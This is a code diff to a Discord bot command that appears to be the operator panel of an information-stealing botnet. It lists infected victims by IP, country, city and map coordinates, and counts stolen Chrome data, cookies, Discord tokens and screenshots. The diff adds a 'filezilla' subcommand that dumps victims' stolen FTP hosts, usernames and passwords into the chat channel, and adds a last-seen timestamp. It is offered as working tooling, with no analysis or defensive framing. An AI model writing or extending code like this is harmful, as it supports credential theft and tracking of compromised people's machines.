@@ -1,4 +1,5 @@
 const fs = require("fs");
+const moment = require("moment");
 const Discord = require("discord.js");
 const paginationEmbed = require("discord.js-pagination");
 const db = require("../models");
@@ -20,7 +21,7 @@ exports.run = (client, message, args) => {
                             **IP Address**: ${element.ipAddress}
                             **Country**: ${element.country}
                             **OS**: ${element.operatingSystem}
-                            **Release**: ${element.release}
+                            **Version**: ${element.version}
                         `,
                         inline: true,
                     });
@@ -59,6 +60,11 @@ exports.run = (client, message, args) => {
         }).then(async (results) => {
             if (results.length > 0) {
                 const element = results[0];
+                const screenshotData = await db.Screenshots.findAll({
+                    where: {
+                        identifier: element.identifier,
+                    },
+                });
                 const chromeData = await db.Chrome.findAll({
                     where: {
                         identifier: element.identifier,
@@ -74,11 +80,14 @@ exports.run = (client, message, args) => {
                         identifier: element.identifier,
                     },
                 });
-                const screenshotData = await db.Screenshots.findAll({
+                const filezillaData = await db.Filezilla.findAll({
                     where: {
                         identifier: element.identifier,
                     },
                 });
+
+                const screenShotPath =
+                    screenshotData.length > 0 ? screenshotData[0].link : "";
 
                 const chromeLength = chromeData.length;
 
@@ -92,8 +101,11 @@ exports.run = (client, message, args) => {
                         ? discordData[0].tokens.split(/TOKEN/).length
                         : 0;
 
-                let screenShotPath =
-                    screenshotData.length > 0 ? screenshotData[0].link : "";
+                const filezillaLength = filezillaData.length;
+
+                const formattedDate = moment(element.updatedAt).format(
+                    "YYYY-MM-DD HH:mm:ss"
+                );
 
                 const embed = new Discord.MessageEmbed()
                     .setColor("#0099ff")
@@ -101,13 +113,12 @@ exports.run = (client, message, args) => {
                         name: !element.tag ? "No tag found" : element.tag,
                         value: `
                             **ID**: ${element.id}
+                            **Last seen**: ${formattedDate}
                             **IP Address**: ${element.ipAddress}
                             **Country**: ${element.country}
                             **Region**: ${element.region}
                             **City**: ${element.city}
-                            **Location**: https://www.google.com/maps/search/?api=1&query=${
-                                element.lat
-                            },${element.lon}
+                            **Location**: https://www.google.com/maps/search/?api=1&query=${element.lat},${element.lon}
                             **ISP**: ${element.isp}
                             **OS**: ${element.operatingSystem}
                             **Release**: ${element.release}
@@ -116,11 +127,8 @@ exports.run = (client, message, args) => {
                             **Processor**: ${element.processor}
                             **Architecture**: ${element.architecture}
                             **Boot Time**: ${element.bootTime}
-                            **Cores**: ${
-                                !element.cpuCores ? "Unknown" : element.cpuCores
-                            }
                             **Memory**: ${element.memory}
-                            **Available Info**: \`Chrome ${chromeLength}\` \`Cookies ${cookieLength}\` \`Discord ${tokensLength}\``,
+                            **Available Info**: \`Chrome ${chromeLength}\` \`Cookies ${cookieLength}\` \`Discord ${tokensLength}\` \`FileZilla ${filezillaLength}\``,
                     })
                     .setThumbnail(
                         `https://www.countryflags.io/${element.countryCode}/flat/64.png`
@@ -238,6 +246,41 @@ exports.run = (client, message, args) => {
                             );
                         } else {
                             message.channel.send("No Cookies found");
+                        }
+                    });
+                } else {
+                    message.channel.send("Client not found");
+                }
+            });
+        } else if (args[1] == "filezilla") {
+            db.Bots.findAll({
+                where: {
+                    [Op.or]: [
+                        {
+                            id: args[0],
+                        },
+                        {
+                            tag: args[0],
+                        },
+                    ],
+                },
+            }).then(async (result) => {
+                if (result.length > 0) {
+                    db.Filezilla.findAll({
+                        where: {
+                            identifier: result[0].identifier,
+                        },
+                    }).then((results) => {
+                        if (results.length > 0) {
+                            let output = "";
+                            results.forEach((element, i) => {
+                                output =
+                                    output +
+                                    `HOST: ${element.host}\nPORT: ${element.port}\nUSERNAME: ${element.user}\nPASSWORD: ${element.password}\n\n`;
+                            });
+                            message.channel.send("```" + output + "```");
+                        } else {
+                            message.channel.send("No Filezilla data found");
                         }
                     });
                 } else {
